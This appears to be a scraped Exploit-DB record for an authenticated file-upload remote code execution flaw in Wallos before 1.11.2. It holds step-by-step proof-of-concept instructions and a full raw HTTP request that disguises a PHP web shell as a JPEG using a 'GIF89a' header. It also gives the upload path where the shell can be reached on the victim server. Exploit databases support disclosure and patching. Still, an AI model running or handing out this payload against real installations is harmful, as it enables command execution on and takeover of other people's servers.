{"source": "https://www.exploit-db.com/exploits/51924", "vulnName": "Wallos < 1.11.2 - File Upload RCE", "vulnEDBID": "51924", "vulnCVE": "N/A", "author": "SML", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-03-25", "vulnContent": "# Exploit Title: Wallos - File Upload RCE (Authenticated)\n# Date: 2024-03-04\n# Exploit Author: sml@lacashita.com\n# Vendor Homepage: https://github.com/ellite/Wallos\n# Software Link: https://github.com/ellite/Wallos\n# Version: < 1.11.2\n# Tested on: Debian 12\n\nWallos allows you to upload an image/logo when you create a new subscription.\nThis can be bypassed to upload a malicious .php file.\n\nPOC\n---\n\n1) Log into the application.\n2) Go to \"New Subscription\"\n3) Upload Logo and choose your webshell .php\n4) Make the Request changing Content-Type to image/jpeg and adding \"GIF89a\", it should be like:\n\n--- SNIP -----------------\n\nPOST /endpoints/subscription/add.php HTTP/1.1\n\nHost: 192.168.1.44\n\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\n\nAccept: */*\n\nAccept-Language: en-US,en;q=0.5\n\nAccept-Encoding: gzip, deflate\n\nReferer: http://192.168.1.44/\n\nContent-Type: multipart/form-data; boundary=---------------------------29251442139477260933920738324\n\nOrigin: http://192.168.1.44\n\nContent-Length: 7220\n\nConnection: close\n\nCookie: theme=light; language=en; PHPSESSID=6a3e5adc1b74b0f1870bbfceb16cda4b; theme=light\n\n-----------------------------29251442139477260933920738324\n\nContent-Disposition: form-data; name=\"name\"\n\ntest\n\n-----------------------------29251442139477260933920738324\n\nContent-Disposition: form-data; name=\"logo\"; filename=\"revshell.php\"\n\nContent-Type: image/jpeg\n\nGIF89a;\n\n<?php\nsystem($_GET['cmd']);\n?> \n\n-----------------------------29251442139477260933920738324\n\nContent-Disposition: form-data; name=\"logo-url\"\n\n----- SNIP -----\n\n5) You will get the response that your file was uploaded ok:\n\n{\"status\":\"Success\",\"message\":\"Subscription updated successfully\"}\n\n\n6) Your file will be located in: \nhttp://VICTIM_IP/images/uploads/logos/XXXXXX-yourshell.php\n            "}